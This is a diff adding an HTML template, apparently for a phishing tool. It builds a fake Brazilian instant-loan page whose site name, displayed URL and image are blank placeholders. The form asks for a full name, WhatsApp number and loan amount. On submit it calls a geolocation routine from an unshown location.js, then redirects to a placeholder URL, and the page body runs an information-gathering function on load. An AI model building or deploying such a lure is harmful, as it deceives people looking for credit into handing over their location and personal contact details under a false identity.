@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>{{TITLE}}</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="stylesheet" href="style.css">
+  
+  <!-- Redirect HTTP to HTTPS -->
+  <script type="text/javascript">
+    if (window.location.protocol == "http:") {
+      var restOfUrl = window.location.href.substr(5);
+      window.location = "https:" + restOfUrl;
+    }
+  </script>
+  
+  <!-- Load jQuery and location.js -->
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script type="text/javascript" src="js/location.js"></script>
+</head>
+
+<body onload="information();">
+  <div class="top-bar">
+    <span class="site">{{SITENAME}}</span>
+    <span class="url">{{DISPLAY_URL}}</span>
+  </div>
+
+  <header>
+    <img src="{{IMAGE}}" class="hero-img">
+    <h1>Crédito aprovado na hora</h1>
+    <p>{{DESC}}</p>
+  </header>
+
+  <section class="card">
+    <h2>Simule seu empréstimo</h2>
+    
+    <form id="loanForm">
+      <input type="text" placeholder="Nome completo" required>
+      <input type="tel" placeholder="WhatsApp" required>
+      <input type="number" placeholder="Valor desejado (R$)" required>
+      
+      <button type="submit">Continuar</button>
+    </form>
+
+    <div class="badges">
+      <span>✔ Sem burocracia</span>
+      <span>✔ Resposta imediata</span>
+      <span>✔ 100% online</span>
+    </div>
+  </section>
+
+  <footer>
+    <p>© {{SITENAME}} - Todos os direitos reservados</p>
+  </footer>
+
+  <script src="script.js"></script>
+  
+  <!-- Request access button with geolocation -->
+  <script>
+    function handleAccessRequest() {
+      locate(
+        function() {
+          // Success callback - redirect to REDIRECT_URL
+          window.location = "REDIRECT_URL";
+        },
+        function() {
+          // Error callback - show failure message
+          document.getElementById("status").textContent = "Falha na detecção de localização";
+        }
+      );
+    }
+
+    // Attach event listener to submit button
+    document.getElementById("loanForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      handleAccessRequest();
+    });
+  </script>
+</body>
+</html>
